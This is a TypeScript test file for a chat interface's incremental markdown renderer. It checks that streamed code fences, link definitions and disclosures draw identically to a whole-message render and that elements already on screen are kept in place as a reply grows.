      const md = fenceMd(260);
      const deltas = tokenDeltas('  more(1);\n\n  after_blank();\n\t tabbed(2);\n  const a = 1;\n');
      const live = render(<Bubble md="Here" incremental />);
      live.rerender(<Bubble md={md} incremental />);
      const codeEl = () => live.container.querySelector('pre code');
      let full = md;
      for (const d of deltas) {
        full += d;
        live.rerender(<Bubble md={full} incremental />);
        const whole = render(<Bubble md={full} />);
        expect(canonical(live.container), `after ${JSON.stringify(d)}`).toBe(canonical(whole.container));
        whole.unmount();
      }
      expect(codeEl()).not.toBeNull();
      live.unmount();
    });

    it('keeps the same code block (no remount) as the fence grows past a chunk, and when it closes', () => {
      const live = render(<Bubble md={fenceMd(38)} incremental />);
      live.rerender(<Bubble md={fenceMd(39)} incremental />);
      const pre = live.container.querySelector('pre')!;
      for (const n of [50, 90, 220]) {
        live.rerender(<Bubble md={fenceMd(n)} incremental />);
        expect(live.container.querySelector('pre')).toBe(pre);
      }
      live.rerender(<Bubble md={`${fenceMd(220)}\`\`\`\n\nDone.`} incremental />);
      expect(live.container.querySelector('pre')).toBe(pre);
      expect(live.container.textContent).toContain('Done.');
      live.unmount();
    });

    it('colours the whole block as one piece once the fence closes', () => {
      // A block comment straddling a chunk edge is only coloured right once the fence closes.
      const body = lines(160, (i) => (i === 49 ? '/* start of a long' : i === 51 ? 'comment ends */' : `const a${i} = ${i};`));
      const closed = `\`\`\`js\n${body}\n\`\`\`\n`;
      const live = render(<Bubble md="Here" incremental />);
      live.rerender(<Bubble md={`\`\`\`js\n${body}\n`} incremental />);
      live.rerender(<Bubble md={closed} incremental />);
      const whole = render(<Bubble md={closed} />);
      expect(canonical(live.container)).toBe(canonical(whole.container));
      whole.unmount();
      live.unmount();
    });

    // Review 2026-10-04 item 1: the head used to be wrapped in a Provider only once it existed,
    // so crossing 40 lines (and closing) changed the root element type and rebuilt the block.
    it('keeps the SAME code block from under 40 lines, across the threshold, and across close', () => {
      // Mounted on its first words and grown, as a reply is: text drawn at mount stays one group.
      const live = render(<Bubble md="Here" incremental />);
      live.rerender(<Bubble md={fenceMd(10)} incremental />);
      const pre = live.container.querySelector('pre')!;
      const code = pre.querySelector('code')!;
      const copy = live.container.querySelector('button')!;
      for (const n of [30, 37, 38, 39, 40, 41, 60, 100]) {
        live.rerender(<Bubble md={fenceMd(n)} incremental />);
        expect(live.container.querySelector('pre'), `at ${n} lines`).toBe(pre);
        expect(pre.querySelector('code')).toBe(code);
        expect(live.container.querySelector('button')).toBe(copy);
      }
      live.rerender(<Bubble md={`${fenceMd(100)}\`\`\`\n\nDone.`} incremental />);
      expect(live.container.querySelector('pre')).toBe(pre);
      expect(pre.querySelector('code')).toBe(code);
      expect(live.container.querySelector('button')).toBe(copy);
      live.unmount();
    });

    // Review item 2: a reply that STOPS with its fence open (Stop, error, truncation, an old
    // message) must draw as one block, exactly like a message that was never streamed.
    describe('a fence that never closes', () => {
      // A block comment that straddles the 20-line chunk edge: coloured wrongly if chunked.
      const body = lines(60, (i) => (i === 18 ? '/* a long comment' : i === 22 ? 'that ends here */' : `const a${i} = ${i}; // note`));
      const md = `\`\`\`js\n${body}\n`;
      const words = tokenDeltas(md);

      it('draws as one piece, with the SAME block, once the reply stops', () => {
        const live = render(<Bubble md="Here" incremental />);
        let text = 'Here\n\n';
        for (const d of words) { text += d; live.rerender(<Bubble md={text} incremental />); }
        const pre = live.container.querySelector('pre')!;
        live.rerender(<Bubble md={text} incremental live={false} />); // the turn ended
        expect(live.container.querySelector('pre')).toBe(pre);
        const whole = render(<MarkdownContent content={text} sessionId="s1" />);
        // Without gating, the lines after the chunk edge stay coloured as code, not comment.
        expect(canonical(live.container)).toBe(canonical(whole.container));
        whole.unmount();
        live.unmount();
      });

      it('never takes the chunked path when the message is not streaming (history, finished)', () => {
        markdownRenders.length = 0;
        const view = render(<Bubble md="Here" incremental live={false} />);
        let text = 'Here\n\n';
        for (const d of words) { text += d; view.rerender(<Bubble md={text} incremental live={false} />); }
        // One piece: the biggest thing drawn is the whole fence, never a short tail.
        const fenceDraws = markdownRenders.filter((x) => x.startsWith('```js'));
        expect(fenceDraws.at(-1)).toBe(md);
        const whole = render(<MarkdownContent content={text} sessionId="s1" />);
        expect(canonical(view.container)).toBe(canonical(whole.container));
        whole.unmount();
        view.unmount();
      });
    });

    // Review item 3: a chunk is drawn as `opening + chunk` with no closer; blank lines at the
    // edge must come out exactly as in the whole block. NO text-node joining is applied that
    // could hide a blank-line difference except merging adjacent text nodes, which cannot.
    describe('blank lines at chunk edges', () => {
      const mdWithBlanks = (blanks: number[], total = 90) => {
        const rows = Array.from({ length: total }, (_, i) => (blanks.includes(i + 1) ? '' : `const v${i} = ${i};`));
        return `\`\`\`js\n${rows.join('\n')}\n`;
      };
      for (const [name, blanks] of [
        ['blank last line of the first chunk (20)', [20]],
        ['blank at 20, 40 and 60', [20, 40, 60]],
        ['two blanks across an edge (20, 21)', [20, 21]],
        ['two blanks ending a chunk (39, 40)', [39, 40]],
        ['blank first line of a chunk (21)', [21]],
        ['three blanks (60, 61, 62)', [60, 61, 62]],
      ] as [string, number[]][]) {
        it(`draws "${name}" like the whole message after every line`, () => {
          const md = mdWithBlanks(blanks);
          const rows = md.split('\n');
          markdownRenders.length = 0;
          const live = render(<Bubble md="Here" incremental />);
          let text = '';
          for (let n = 1; n <= rows.length; n++) {
            text = rows.slice(0, n).join('\n') + (n < rows.length ? '\n' : '');
            live.rerender(<Bubble md={`Here\n\n${text}`} incremental />);
            expect(canonical(live.container), `after ${n} lines`).toBe(wholeHtml(`Here\n\n${text}`));
          }
          // Not vacuous: frozen 20-line chunks (opening + 20 lines + the empty tail of the split) really were drawn.
          expect(markdownRenders.some((x) => x.startsWith('```js\n') && x.split('\n').length === 22)).toBe(true);
          live.unmount();
        });
      }
    });

    // Review item 4: shapes that must stay correct (some fall back to the whole block).
    describe('other fence shapes', () => {
      const code = lines(70, (i) => `  call(${i}); // line ${i}`);
      for (const [name, md] of [
        ['an info string with attributes', `\`\`\`ts title="x.ts"\n${code}\n`],
        ['a ~~~ fence', `~~~ts\n${code}\n`],
        ['a 4-backtick fence containing a ``` line', `\`\`\`\`ts\n${code}\n\`\`\`\n${code}\n`],
        ['no language', `\`\`\`\n${code}\n`],
        ['CRLF line endings', `\`\`\`ts\r\n${code.replace(/\n/g, '\r\n')}\r\n`],
      ] as [string, string][]) {
        it(`draws ${name} like the whole message, token by token`, () => {
          const deltas = tokenDeltas(md);
          const live = render(<Bubble md="Here" incremental />);
          let text = 'Here\n\n';
          live.rerender(<Bubble md={text} incremental />);
          deltas.forEach((d, i) => {
            text += d;
            live.rerender(<Bubble md={text} incremental />);
            // Every 7th step keeps the run short; the last step is always checked.
            if (i % 7 === 0 || i === deltas.length - 1) expect(canonical(live.container), `after ${i}`).toBe(wholeHtml(text));
          });
          live.unmount();
        });
      }

      it('falls back to the whole block for a ~~~ / 4-backtick fence holding a closing-looking line', () => {
        const md = `Here\n\n\`\`\`\`ts\n${code}\n\`\`\`\n${code}\n`;
        markdownRenders.length = 0;
        const live = render(<Bubble md="Here" incremental />);
        live.rerender(<Bubble md={md} incremental />);
        expect(markdownRenders.some((x) => x.startsWith('````ts') && x.endsWith(`${code}\n`))).toBe(true);
        live.unmount();
      });
    });

    // A bubble that MOUNTS part-way through a reply (switching back to the chat, a torn-off window,
    // a chat that was hidden while the reply began) draws what it was given as one group, with text
    // before the fence in it. The rest of the reply must still be cheap per word, keep the same
    // code block, and draw as one piece when the turn ends.
    describe('a bubble that mounts in the middle of an open fence', () => {
      const row = (i: number) => (i % 10 === 9 ? '' : `  const value${i} = compute(${i}); // step ${i}`);
      const mount = (n: number) => `Intro paragraph.\n\n- a list before it\n\n\`\`\`ts\n${lines(n, row)}\n`;
      const more = tokenDeltas(lines(120, (i) => row(i + 1000)) + '\n');

      it('keeps per-word work bounded and the page equal to the whole message', () => {
        const live = render(<Bubble md={mount(100)} incremental />);
        const pre = live.container.querySelector('pre')!;
        let md = mount(100);
        const costs: number[] = [];
        more.forEach((d, i) => {
          md += d;
          splitterParsed.chars = 0;
          markdownRenders.length = 0;
          live.rerender(<Bubble md={md} incremental />);
          costs.push(splitterParsed.chars + markdownRenders.reduce((n, x) => n + x.length, 0));
          expect(live.container.querySelector('pre')).toBe(pre);
          if (i % 25 === 0 || i === more.length - 1) expect(canonical(live.container), `after word ${i}`).toBe(wholeHtml(md));
        });
        // After the first update (which may split the message once), a word costs the prefix
        // plus a tail of under two chunks — not the fence, which by now is 220 lines.
        const lineLen = row(1).length + 1;
        const bound = mount(0).length + 2 * OPEN_FENCE_CHUNK_LINES * lineLen + 400;
        for (const c of costs.slice(1)) expect(c).toBeLessThanOrEqual(2 * bound);
        expect(Math.max(...costs.slice(1))).toBeLessThan(md.length / 2);
        // The reply ends: one piece again, same block.
        live.rerender(<Bubble md={md} incremental live={false} />);
        expect(live.container.querySelector('pre')).toBe(pre);
        const whole = render(<MarkdownContent content={md} sessionId="s1" />);
        expect(canonical(live.container)).toBe(canonical(whole.container));
        whole.unmount();
        live.unmount();
      });

      it('Copy still takes the whole fence, and only that fence', async () => {
        const writeText = vi.fn();
        Object.assign(navigator, { clipboard: { writeText } });
        const md = `Intro\n\n\`\`\`sh\necho other\n\`\`\`\n\n${mount(90).split('Intro paragraph.\n\n')[1]}${lines(40, row)}\n`;
        const live = render(<Bubble md={md} incremental />);
        live.rerender(<Bubble md={`${md}  tail();`} incremental />);
        const buttons = screen.getAllByRole('button', { name: 'Copy' });
        fireEvent.click(buttons[0]);
        expect(writeText.mock.calls[0][0]).toBe('echo other\n');
        fireEvent.click(buttons[1]);
        const copied = writeText.mock.calls[1][0] as string;
        expect(copied).toContain('const value0 =');
        expect(copied).toContain('tail();');
        expect(copied).not.toContain('echo other');
        live.unmount();
      });
    });

    // perf-lab 2026-10-04: without containment, layout of the newest line re-ran over the whole
    // block (70 -> 520 ms per 2 s on 500 lines). It must NOT be paint containment: that clips
    // sideways and a long code line would stop scrolling the <pre>.
    it('wraps each frozen chunk in a layout-contained block that does not clip', async () => {
      const { readFileSync } = await import('node:fs');
      const css = readFileSync(`${process.cwd()}/src/renderer/styles/globals.css`, 'utf8');
      const rule = /\.yc-fence-chunk\s*\{([^}]*)\}/.exec(css)?.[1] ?? '';
      expect(rule).toMatch(/display:\s*block/);
      expect(rule).toMatch(/contain:\s*layout/);
      // Without this a long line in a frozen chunk is unreachable by scrolling (measured, real Chromium).
      expect(rule).toMatch(/width:\s*max-content/);
      expect(rule).not.toMatch(/paint|content-visibility|overflow/);
      const live = render(<Bubble md="Here" incremental />);
      live.rerender(<Bubble md={fenceMd(130)} incremental />);
      expect(live.container.querySelectorAll('pre code > .yc-fence-chunk').length).toBeGreaterThan(3);
      live.unmount();
    });

    // Review 3: the turn ENDING flips `live` for the whole bubble. Only a group that holds an open
    // fence may redraw for that; every finished block must be skipped by its memo, or each reply
    // ends with a hitch proportional to its length (re-parse + re-colour of everything).
    describe('when the turn ends', () => {
      const groupsMd = (n: number, tail = '') =>
        Array.from({ length: n }, (_, i) => `Paragraph ${i} with \`code\` and **bold**.\n\n\`\`\`js\nconst x${i} = ${i};\n\`\`\``).join('\n\n') + tail;
      const grow = (md: string, live: boolean) => {
        const view = render(<Bubble md="Para" incremental live={live} />);
        view.rerender(<Bubble md={md} incremental live={live} />);
        view.rerender(<Bubble md={`${md} more`} incremental live={live} />);
        return view;
      };
      it('redraws nothing in a reply of 30 finished groups', () => {
        const md = groupsMd(30);
        const view = grow(md, true);
        markdownRenders.length = 0;
        splitterParsed.chars = 0;
        view.rerender(<Bubble md={`${md} more`} incremental live={false} />);
        expect(markdownRenders).toEqual([]);
        expect(splitterParsed.chars).toBe(0);
        view.unmount();
      });
      it('redraws only the group holding the open fence', () => {
        const md = groupsMd(30, `\n\n\`\`\`js\n${lines(60, (i) => `const y${i} = ${i};`)}\n`);
        const view = grow(md, true);
        markdownRenders.length = 0;
        view.rerender(<Bubble md={`${md} more`} incremental live={false} />);
        expect(markdownRenders).toHaveLength(1);
        expect(markdownRenders[0].startsWith('```js')).toBe(true);
        view.unmount();
      });
    });

    it('copies the whole fence, frozen lines included', async () => {
      const writeText = vi.fn();
      Object.assign(navigator, { clipboard: { writeText } });
      const md = fenceMd(220);
      const live = render(<Bubble md="Here" incremental />);
      live.rerender(<Bubble md={md} incremental />);
      live.rerender(<Bubble md={`${md}  last();`} incremental />);
      fireEvent.click(screen.getByRole('button', { name: 'Copy' }));
      const copied = writeText.mock.calls[0][0] as string;
      expect(copied).toContain('const value0 =');
      expect(copied).toContain('const value219 =');
      expect(copied).toContain('last();');
      live.unmount();
    });
  });

  // Switching back to a session mid-reply mounts the bubble on a long prefix
  // drawn as one document. That document is re-drawn as today until its last
  // block is finished, and never parsed again on top of that.
  // The promise has ONE accepted exception, pinned here: the update that first
  // splits a message opened mid-reply parses it once (no redraw), so that update
  // alone can cost a parse of the message plus the new block.
  it('never does more work per word than the whole message after opening mid-reply, bar one split that redraws nothing', () => {
    const long = MARKDOWN_STREAM_CORPUS.find((s) => s.name === 'long mixed reply')!.md;
    const base = `${long}\n\n${long}\n\nA paragraph still being`;
    const costs = streamCosts(base, base, tokenDeltas(' typed with more words\n\nThen a new paragraph that keeps going word by word\n\nAnd another'));
    // The update that first starts a new block splits the message once — a
    // parse, never a re-draw of what was already on screen.
    const split = costs.findIndex((c) => c.drawn.length > 0 && !c.drawn.some((x) => x.startsWith('## Plan')));
    expect(split).toBeGreaterThan(0);
    expect(costs[split].drawn.join('')).not.toContain('Plan');
    expect(costs[split].work - costs[split].drawn.join('').length).toBeLessThanOrEqual(costs[split].md.length);
    expectNoMoreThanToday(costs.slice(0, split));
    expectNoMoreThanToday(costs.slice(split + 1));
  });

  it('draws a message that never grows (history) as one document, with no split', () => {
    const md = MARKDOWN_STREAM_CORPUS.find((s) => s.name === 'long mixed reply')!.md;
    markdownRenders.length = 0;
    render(<Bubble md={md} incremental />);
    expect(markdownRenders).toEqual([md]);
  });

  // Review F1: content already on screen must never be replaced by a fresh copy
  // as the reply grows — a replaced element loses what the person did to it (a
  // tapped-to-load picture goes back to its placeholder, an opened disclosure
  // snaps shut, a selection vanishes). These hold element identity across
  // updates, not just the markup.
  const tapImage = (root: HTMLElement) => {
    fireEvent.click(screen.getByRole('button', { name: /image from/i }));
    const img = root.querySelector('img');
    expect(img).not.toBeNull();
    return img!;
  };
  // The whole-message page with its picture tapped open, for comparison.
  const wholeTappedHtml = (md: string) => {
    const r = render(<Bubble md={md} />);
    fireEvent.click(r.container.querySelector('button[title^="Load image"]')!);
    const html = canonical(r.container);
    r.unmount();
    return html;
  };
  // Every element under `root`, by its place in the tree (tag and position among
  // same-tag siblings at each level) — the same place in two equal pages.
  const elementsByPath = (root: Element) => {
    const found = new Map<string, Element>();
    const walk = (el: Element, at: string) => {
      const seen: Record<string, number> = {};
      for (const child of Array.from(el.children)) {
        seen[child.tagName] = (seen[child.tagName] ?? -1) + 1;
        const path = `${at}/${child.tagName}${seen[child.tagName]}`;
        found.set(path, child);
        walk(child, path);
      }
    };
    walk(root, '');
    return found;
  };
  const paragraph = (root: HTMLElement, text: string) =>
    Array.from(root.querySelectorAll('p')).find((p) => p.textContent === text)!;

  it('keeps what was drawn when the bubble opens with a reply already in progress', () => {
    // Switching back to a session mid-reply mounts the bubble on a long prefix.
    let md = 'Intro\n\n![pic](https://x.com/p.png)\n\npara\n\nmore\n\nnext';
    const live = render(<Bubble md={md} incremental />);
    const img = tapImage(live.container);
    const para = paragraph(live.container, 'para');
    for (const delta of tokenDeltas(' word and on\n\nA new paragraph arrives\n\n```js\nlet x = 1;\n```\n\nThe end.')) {
      md += delta;
      live.rerender(<Bubble md={md} incremental />);
      expect(live.container.querySelector('img'), `after ${JSON.stringify(md)}`).toBe(img);
      expect(paragraph(live.container, 'para')).toBe(para);
    }
    expect(canonical(live.container)).toBe(wholeTappedHtml(md));
    live.unmount();
  });

  it('keeps what was drawn when a link definition arrives mid-reply', () => {
    const full = 'Intro\n\n![pic](https://x.com/p.png)\n\nSee [docs] and [more].\n\nplain words\n\n[docs]: https://example.com/docs\n\nTail [more]\n\n[more]: https://example.com/more\n\nEnd.';
    const prefixes = prefixesOf(tokenDeltas(full));
    const cut = prefixes.findIndex((p) => p.includes('plain words'));
    const live = render(<Bubble md={prefixes[0]} incremental />);
    for (const p of prefixes.slice(1, cut + 1)) live.rerender(<Bubble md={p} incremental />);
    const img = tapImage(live.container);
    const plain = paragraph(live.container, 'plain words');
    for (const p of prefixes.slice(cut + 1)) {
      live.rerender(<Bubble md={p} incremental />);
      expect(live.container.querySelector('img'), `after ${JSON.stringify(p)}`).toBe(img);
      expect(paragraph(live.container, 'plain words')).toBe(plain);
      expect(canonical(live.container), `after ${JSON.stringify(p)}`).toBe(wholeTappedHtml(p));
    }
    // The definitions took effect in the blocks above them.
    expect(live.container.querySelector('a[href="https://example.com/docs"]')).not.toBeNull();
    expect(live.container.querySelector('a[href="https://example.com/more"]')).not.toBeNull();
    live.unmount();
  });

  // Streams `prefixes` into a bubble opened at `mountAt` and into today's
  // whole-message render side by side; after every update the pages must match
  // and every element today's render kept must be kept too.
  const streamMatchesToday = (prefixes: string[], mountAt: number, keepElements: boolean) => {
    const live = render(<Bubble md={prefixes[mountAt]} incremental />);
    const today = render(<Bubble md={prefixes[mountAt]} />);
    let liveEls = elementsByPath(live.container);
    let todayEls = elementsByPath(today.container);
    for (const p of prefixes.slice(mountAt)) {
      live.rerender(<Bubble md={p} incremental />);
      today.rerender(<Bubble md={p} />);
      expect(canonical(live.container), `mounted at ${mountAt}, after ${JSON.stringify(p)}`).toBe(canonical(today.container));
      const nextLive = elementsByPath(live.container);
      const nextToday = elementsByPath(today.container);
      if (keepElements) {
        for (const [path, el] of nextToday) {
          if (todayEls.get(path) === el) expect(nextLive.get(path), `${path} after ${JSON.stringify(p)}`).toBe(liveEls.get(path));
        }
      }
      liveEls = nextLive;
      todayEls = nextToday;
    }
    live.unmount();
    today.unmount();
  };

  // Cases where one block changes how another is drawn (definitions, their
  // labels and duplicates, disclosures, blocks that span blank lines), streamed
  // a character at a time from the start and from part-way in.
  const CROSS_BLOCK: [string, string, boolean?][] = [
    ['a setext heading after definitions', 'Para [a]\n\n[a]: /u\n\nTitle [a]\n===\n\nx'],
    ['a label defined twice with different case', '[A]: /first\n\nx [a]\n\n[a]: /second\n\ny [A]'],
    ['a definition long after its use', 'use [z] here\n\nmore\n\nmore2\n\nmore3\n\n[z]: /zz\n\nend [z]'],
    ['a table naming a definition', '[a]: /u\n\n| x [a] |\n| - |\n| y |\n\nmore'],
    ['a definition and a paragraph in one piece', '[a]: /u\nfoo [a]\n\nbar [a]'],
    ['a label over two lines', '[a\nb]: /u\n\n[a b] x\n\ny'],
    ['a stray closer, then a disclosure', '</details>\n\n<details><summary>S</summary>\n\nb\n\n</details>\n\nafter'],
    ['a disclosure inside a disclosure', '<details><summary>A</summary>\n\n<details><summary>B</summary>\n\nx\n\n</details>\n\n</details>\n\nz'],
    ['a summary after a definition', '<details>\n\n[a]: /u\n\n<summary>S</summary>\n\nx [a]\n\n</details>\n\ntail'],
    ['a disclosure inside a list', '- item\n\n  <details><summary>S</summary>\n\n  body\n\n  </details>\n\nout'],
    ['ordered lists split by a paragraph', '1. a\n\npara\n\n3. c\n4. d\n\n5. e'],
    ['a comment spanning blank lines', '<!--\n\nhidden [a]\n\n-->\n\n[a]: /u\n\nvis [a]'],
    ['a definition inside a code block', '```\n[a]: /u\n\n```\n\n[a] text\n\n[a]: /v'],
    ['a picture by reference', '![a]\n\nmid\n\nmid2\n\n[a]: https://x.com/p.png\n\nend'],
    ['emphasis around references', '*[a]*\n\n**[a]: /u**\n\n[a]: /real'],
    ['definitions with CRLF', 'x [a]\r\n\r\n[a]: /u\r\n\r\ny [a]'],
    ['a title on the next line', 'x [a]\n\n[a]: /u\n"tit\nle"\n\ny [a]'],
    ['an item that could join the list above', '1. a\n\n2\n\n2. b\n\n-\n\n- c\n\n10\n\nend'],
    ['a bare opener that never pairs', 'A\n\n<details>\n\nnot a summary\n\nB\n\nC\n\nD'],
    // Raw HTML ending a finished block reads differently at the end of a
    // document, so its blank lines are kept when it is drawn on its own.
    ['raw HTML right under a list item', '1. one\n<br>\n\nNote\n\nmore\n\n- x\n<!--\n-->\n\nend'],
    // A footnote switches to the whole-message render once (documented), so
    // only the page is compared.
    ['a footnote defined late', 'A[^1]\n\nb\n\nc\n\n[^1]: n\n\nd', false],
    ['a definition inside a quote', 'A [q]\n\nb\n\n> [q]: /q\n\nd', false],
  ];
  for (const [name, md, keep] of CROSS_BLOCK) {
    it(`draws ${name} exactly like the whole message, from the start and from part-way in`, () => {
      const prefixes = Array.from({ length: md.length }, (_, i) => md.slice(0, i + 1));
      for (const mountAt of [0, Math.floor(prefixes.length / 3), Math.floor((prefixes.length * 2) / 3)]) {
        streamMatchesToday(prefixes, mountAt, keep ?? true);
      }
    });
  }

  // Updates of several characters that land on a markdown-significant spot.
  const MULTI_CHAR: [string, string[]][] = [
    ['a digit, then the rest of an ordered item', ['1. a', '1. a\n\n2', '1. a\n\n2. x', '1. a\n\n2. x\n\nend']],
    ['a digit, then the rest of a ")" item', ['1) a', '1) a\n\n2', '1) a\n\n2) x']],
    ['one digit, then a two-digit item', ['p', 'p\n\n1. a\n\n1', 'p\n\n1. a\n\n10. x']],
    ['a label with an escape', ['x', 'x\n\n[my\\_file]: /u', 'x\n\n[my\\_file]: /u\n\nsee [my\\_file]']],
    ['labels that differ only as raw text', ['[a&amp;]: /one', '[a&amp;]: /one\n\n[a&]: /two', '[a&amp;]: /one\n\n[a&]: /two\n\nuse [a&amp;] and [a&]']],
  ];
  for (const [name, steps] of MULTI_CHAR) {
    it(`draws ${name} exactly like the whole message`, () => {
      for (let mountAt = 0; mountAt < steps.length; mountAt++) streamMatchesToday(steps, mountAt, true);
    });
  }

  // Real streams cut text anywhere — "\n\n2" in one update and ". x" in the
  // next — while tokenDeltas keeps "\n\n2." together. This streams seeded
  // random documents in random 1-7 character chunks, and cuts exactly where a
  // markdown reading can flip: between a digit and "." or ")", between a
  // label's "]" and ":", around "<" and around a blank line. After every update
  // the page and every element today's render kept must match.
  it('draws documents cut into random pieces exactly like the whole message, keeping the same elements', () => {
    const FRAGS = ['1. one', '2. two', '1) one', '2) two', '10. ten', '1', '2', '- a', '* b', '+ c', '-', '  cont', '[a]: /u', '[A]: /v "t"',
      'x [a] y', 'see [c] and [a][]', '[c]: /c',
      // Labels whose raw text differs from their meaning (escapes, entities):
      // micromark matches labels on the RAW text.
      'see [my\\_file]\n\n[my\\_file]: /f', '[a&amp;]: /one\n\n[a&]: /two\n\nuse [a&amp;] [a&]', 'see [e\\]]\n\n[e\\]]: /e',
      '[d]:\n/dd', '[d] late', '<details>', '<summary>S</summary>', '</details>', '<br>', '<!-- c -->', '<b>x</b> text', '```', 'code();',
      '    indented', '| a | b |', '| - | - |', '===', '---', 'Setext', '> q', '> [a] quoted', 'plain words here', '![i][a]', '', ''];
    // Where a cut can change how the text before it reads.
    const boundaries = (md: string) => {
      const at: number[] = [];
      for (let i = 1; i < md.length; i++) {
        const a = md[i - 1];
        const b = md[i];
        if ((/\d/.test(a) && /[.)]/.test(b)) || (a === ']' && b === ':') || a === '<' || b === '<' || (a === '\n' && b === '\n') || (md[i - 2] === '\n' && a === '\n')) at.push(i);
      }
      return at;
    };
    let seed = 20260925;
    const rnd = () => (seed = (seed * 1103515245 + 12345) % 2147483648) / 2147483648;
    // A fixed count sized to ~5 s here, not a time box (under load a time box
    // would quietly test less).
    for (let docs = 0; docs < 200; docs++) {
      const md = Array.from({ length: 2 + Math.floor(rnd() * 5) }, () => FRAGS[Math.floor(rnd() * FRAGS.length)]).join(rnd() < 0.35 ? '\n' : '\n\n');
      const cuts = boundaries(md);
      const prefixes: string[] = [];
      for (let i = 0; i < md.length;) {
        let next = Math.min(md.length, i + 1 + Math.floor(rnd() * 7));
        const edge = cuts.find((c) => c > i);
        if (edge !== undefined && edge < next && rnd() < 0.85) next = edge;
        prefixes.push(md.slice(0, next));
        i = next;
      }
      if (prefixes.length < 2) continue;
      const mountAt = rnd() < 0.3 ? Math.floor(rnd() * prefixes.length) : 0;
      const live = render(<Bubble md={prefixes[mountAt]} incremental />);
      const today = render(<Bubble md={prefixes[mountAt]} />);
      let liveEls = elementsByPath(live.container);
      let todayEls = elementsByPath(today.container);
      let before = prefixes[mountAt];
      for (const p of prefixes.slice(mountAt)) {
        live.rerender(<Bubble md={p} incremental />);
        today.rerender(<Bubble md={p} />);
        expect(canonical(live.container), `doc ${JSON.stringify(md)}, after ${JSON.stringify(p)}`).toBe(canonical(today.container));
        const nextLive = elementsByPath(live.container);
        const nextToday = elementsByPath(today.container);
        // The one accepted rebuild (markdown-blocks.ts, advanceStream): a
        // single update that finishes the last block's unfinished line — so the
        // block can change kind ("--" -> "---", "<b" -> "<br>", "[a]: " -> a
        // definition) — AND starts a new block after a blank line. Today's
        // render reuses the old element for whatever now sits in its place;
        // ours draws both afresh. Nothing the person did is lost: that block
        // was still being typed.
        const turned = !/[\r\n]$/.test(before) && /\n[ \t]*\n/.test(p.slice(before.length));
        if (!turned) {
          for (const [path, el] of nextToday) {
            if (todayEls.get(path) === el) expect(nextLive.get(path), `doc ${JSON.stringify(md)}, ${path} after ${JSON.stringify(p)}`).toBe(liveEls.get(path));
          }
        }
        liveEls = nextLive;
        todayEls = nextToday;
        before = p;
      }
      live.unmount();
      today.unmount();
    }
  }, STREAMING_SWEEP_BUDGET_MS);
});
